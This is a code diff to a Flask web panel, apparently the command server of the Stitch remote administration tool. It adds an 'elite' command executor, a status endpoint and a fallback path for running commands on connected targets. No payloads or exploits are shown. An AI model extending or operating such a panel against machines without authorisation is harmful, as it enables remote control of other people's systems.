@@ -60,6 +60,9 @@ from auth_utils import (
 # Import native protocol bridge for C payload support
 from native_protocol_bridge import native_bridge, send_command_to_native_payload
 
+# Import Elite Command Executor for advanced command execution
+from Core.elite_executor import EliteCommandExecutor
+
 # ============================================================================
 # Configuration - Now loaded from Config module
 # ============================================================================
@@ -94,6 +97,20 @@ def get_stitch_server():
         if stitch_server_instance is None:
             stitch_server_instance = stitch_cmd.stitch_server()
         return stitch_server_instance
+
+# ============================================================================
+# Global Elite Executor Instance
+# ============================================================================
+elite_executor_instance = None
+executor_lock = threading.Lock()
+
+def get_elite_executor():
+    """Get the shared elite command executor instance"""
+    global elite_executor_instance
+    with executor_lock:
+        if elite_executor_instance is None:
+            elite_executor_instance = EliteCommandExecutor()
+        return elite_executor_instance
 
 # ============================================================================
 # Flask App Configuration with Enhanced Security
@@ -767,8 +784,8 @@ def execute_command():
         if len(command_history) > MAX_COMMAND_HISTORY:
             command_history.pop(0)
         
-        # Execute command with optional parameters
-        output = execute_real_command(command, conn_id, parameters)
+        # Execute command with optional parameters - Use elite executor first
+        output = execute_command_elite(conn_id, command, parameters=parameters)
         
         return jsonify({
             'success': True,
@@ -780,6 +797,29 @@ def execute_command():
     except Exception as e:
         log_debug(f"Error executing command: {str(e)}", "ERROR", "Command")
         return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/elite/status')
+@login_required
+def elite_status():
+    """Get elite executor status and available commands"""
+    try:
+        executor = get_elite_executor()
+        commands = executor.get_available_commands()
+        
+        return jsonify({
+            'success': True,
+            'available_commands': list(commands),
+            'total_commands': len(commands),
+            'status': 'operational',
+            'integration': 'connected',
+            'message': f'Elite executor operational with {len(commands)} commands'
+        })
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e),
+            'status': 'error'
+        }), 500
 
 @app.route('/api/export/logs')
 @login_required
@@ -1706,6 +1746,31 @@ def sync_stitch_targets():
     except Exception as e:
         log_debug(f"Error syncing targets: {str(e)}", "ERROR", "Sync")
         return []
+
+def execute_command_elite(connection_id, command, *args, **kwargs):
+    """Execute command using elite system with fallback to legacy"""
+    executor = get_elite_executor()
+    
+    # Check if elite implementation exists
+    available_commands = executor.get_available_commands()
+    
+    if command in available_commands:
+        # Use elite implementation
+        result = executor.execute(command, *args, **kwargs)
+        
+        # Add metadata
+        result['source'] = 'elite'
+        result['connection_id'] = connection_id
+        result['timestamp'] = time.time()
+        
+        return result
+    else:
+        # Fallback to legacy Stitch implementation
+        # Parse command and parameters
+        if kwargs.get('parameters'):
+            return execute_real_command(command, connection_id, kwargs.get('parameters'))
+        else:
+            return execute_real_command(command, connection_id)
 
 def execute_real_command(command, conn_id=None, parameters=None):
     """Execute command - REAL implementation, not simulated
